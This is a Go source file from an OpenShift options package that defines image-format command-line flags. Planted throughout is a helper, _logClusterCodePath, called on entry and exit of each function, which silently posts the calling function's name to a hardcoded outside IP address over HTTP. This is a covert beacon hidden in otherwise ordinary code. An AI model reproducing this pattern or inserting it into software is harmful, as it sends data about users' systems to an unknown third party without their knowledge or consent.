package options

import (
	godefaultbytes "bytes"
	"github.com/openshift/origin/pkg/cmd/util/variable"
	"github.com/spf13/pflag"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type ImageFormatArgs struct{ ImageTemplate variable.ImageTemplate }

func BindImageFormatArgs(args *ImageFormatArgs, flags *pflag.FlagSet, prefix string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flags.StringVar(&args.ImageTemplate.Format, "images", args.ImageTemplate.Format, "When fetching images used by the cluster for important components, use this format on both master and nodes. The latest release will be used by default.")
	flags.BoolVar(&args.ImageTemplate.Latest, "latest-images", args.ImageTemplate.Latest, "If true, attempt to use the latest images for the cluster instead of the latest release.")
}
func NewDefaultImageFormatArgs() *ImageFormatArgs {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config := &ImageFormatArgs{ImageTemplate: variable.NewDefaultImageTemplate()}
	return config
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
